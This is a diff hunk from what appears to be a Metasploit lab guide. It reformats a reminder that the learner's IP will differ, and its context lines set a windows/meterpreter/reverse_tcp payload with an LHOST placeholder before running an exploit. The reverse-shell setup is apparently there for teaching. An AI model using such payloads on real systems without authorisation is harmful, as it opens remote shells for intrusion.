@@ -151,7 +151,9 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST [Your Linux IP Address]
 ```
 
-**REMEMBER - YOUR IP WILL LIKELY BE DIFFERENT!**
+>[!Note]
+>
+>REMEMBER - YOUR IP WILL LIKELY BE DIFFERENT!**
 
 Go ahead and run the exploit:
 
